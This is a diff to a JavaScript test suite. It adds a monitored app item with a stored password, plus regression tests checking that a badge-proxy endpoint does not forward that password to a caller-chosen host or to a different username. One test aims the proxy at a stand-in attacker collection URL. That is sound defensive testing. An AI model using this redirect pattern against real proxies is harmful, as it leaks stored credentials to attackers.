@@ -56,6 +56,17 @@ before(async () => {
         },
       },
       {
+        id: 'app-login',
+        type: 'app',
+        monitoring: {
+          activity: {
+            enabled: true,
+            url: `${realBase}/login-api`,
+            login: { username: 'monitor', password: SECRET_VALUE },
+          },
+        },
+      },
+      {
         id: 'w1',
         type: 'widget',
         widgetType: 'books',
@@ -169,6 +180,38 @@ test('badge-proxy does not reuse the stored credential with certificate checking
   });
   assert.equal(realSeen.length, 1, 'the request should still go out, just without the secret');
   assert.ok(!sawSecret(realSeen), 'a changed certificate setting must not reuse the credential');
+});
+
+const basicPassword = seen => {
+  const auth = seen.at(-1)?.headers.authorization || '';
+  return Buffer.from(auth.replace(/^Basic /, ''), 'base64')
+    .toString()
+    .split(':')[1];
+};
+
+test('badge-proxy signs in with the stored password at the saved destination', async () => {
+  realSeen.length = 0;
+  const r = await post('/api/badge-proxy', {
+    itemId: 'app-login',
+    url: `${realBase}/login-api`,
+    login: { username: 'monitor' },
+  });
+  assert.equal(r.status, 200);
+  assert.equal(basicPassword(realSeen), SECRET_VALUE);
+});
+
+test('badge-proxy does not send the stored password to a caller-chosen host', async () => {
+  evilSeen.length = 0;
+  await post('/api/badge-proxy', { itemId: 'app-login', url: `${evilBase}/collect`, login: { username: 'monitor' } });
+  assert.equal(evilSeen.length, 1);
+  assert.notEqual(basicPassword(evilSeen), SECRET_VALUE);
+});
+
+test('badge-proxy does not send the stored password for another username', async () => {
+  realSeen.length = 0;
+  await post('/api/badge-proxy', { itemId: 'app-login', url: `${realBase}/login-api`, login: { username: 'admin' } });
+  assert.equal(realSeen.length, 1);
+  assert.notEqual(basicPassword(realSeen), SECRET_VALUE);
 });
 
 /* ── widget-options ───────────────────────────────────────────────────────── */
